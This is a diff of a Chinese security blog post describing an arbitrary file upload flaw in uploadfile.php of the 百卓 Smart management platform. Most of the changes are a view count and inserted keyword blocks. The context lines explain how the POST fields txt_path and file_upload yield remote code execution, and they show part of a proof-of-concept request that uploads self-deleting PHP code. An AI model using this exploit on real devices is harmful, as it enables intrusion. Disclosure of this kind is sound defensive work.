@@ -7,17 +7,17 @@ asset_dir: assets/百卓smart管理平台-uploadfile.php-文件上传漏洞
 # 百卓Smart管理平台 uploadfile.php 文件上传漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/1/19 18:43
-- 1261浏览
+- 1262浏览
 - [0评论](#comment)
 - 16分钟阅读
 
 深入探索
 
+北京百卓网络技术有限公司
+
+身份验证
+
 百卓网络
-
-服务器
-
-SQL
 
 ---
 
@@ -71,6 +71,14 @@ if(isset($_POST['txt_path']))
 </html>
 ```
 
+深入探索
+
+服务器安全服务
+
+JSON处理工具
+
+恶意软件分析工具
+
 从 POST请求获取 `txt_path` 的值作为文件储存路径（需要一个可写权限的目录），上传里的filename随意，上传文件name部分为 `file_upload` 即可实现任意文件上传致RCE效果。
 
 网络设备
@@ -92,6 +100,14 @@ Content-Disposition: form-data; name="file_upload"; filename="test.png"
 <?=md5(123456);unlink(__FILE__);
 ------123456--
 ```
+
+深入探索
+
+授权
+
+代码安全审计
+
+防火墙软件
 
 [![百卓Smart管理平台 uploadfile.php 文件上传漏洞](images/img-001-6db68ff2583d.webp)](https://image.mrxn.net/a9f0669c38624074810e3e53f619ce51.webp)
 
